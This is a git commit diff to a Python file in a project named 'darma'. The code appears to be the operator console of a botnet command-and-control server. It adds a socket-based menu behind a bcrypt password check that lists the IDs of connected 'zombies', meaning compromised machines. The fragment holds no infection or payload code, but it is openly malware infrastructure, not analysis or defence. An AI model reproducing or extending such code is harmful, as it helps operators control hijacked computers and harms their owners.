26338229b1f384f0b0696dab3a5f7e8389b07088
root <okmanolos1@hotmail.com>
2020-06-17 12:12:28 -0400

    fixed master connection and menu

--- darma/command.py
+++ darma/command.py
@@ -5,10 +5,24 @@ import bcrypt
 
 
 
+
+
+def print_menu(socket):
+	menu = """ 
+0) List zombies
+1) Exit
+
+Please enter choice: 
+		"""
+	socket.send(menu.encode())
+	choice = int(socket.recv(2048).decode('utf-8'))
+	print(choice)
+	return choice
+
 def start():
 	# bcrypt password hash
 	hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
-	#hash = b'$2b$12$ai/fCX5Y3t9TxXTRyke7GOGAZvKs2yyh4hBxuMkPji9s.zM0Me/jG'
+
 	# create an INET, STREAMing socket
 	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	# bind the socket to a public host, and a well-known port
@@ -24,9 +38,13 @@ def start():
 		password = clientsocket.recv(2048)
 		if not bcrypt.checkpw(password, hash):
 			clientsocket.close()
-		while True:
-			# Print active zombie IDs
-			for z in listener.zombies:
-				clientsocket.send(z.id.encode())
-			# Exit
-			clientsocket.close()
+		while clientsocket.fileno() != -1:
+			choice = print_menu(clientsocket)
+			if choice == 0:
+			# List zombies
+                        	for z in listener.zombies:
+                                	clientsocket.send(z.id.encode())				
+			if choice == 1:
+				# Exit
+				clientsocket.close()
+				
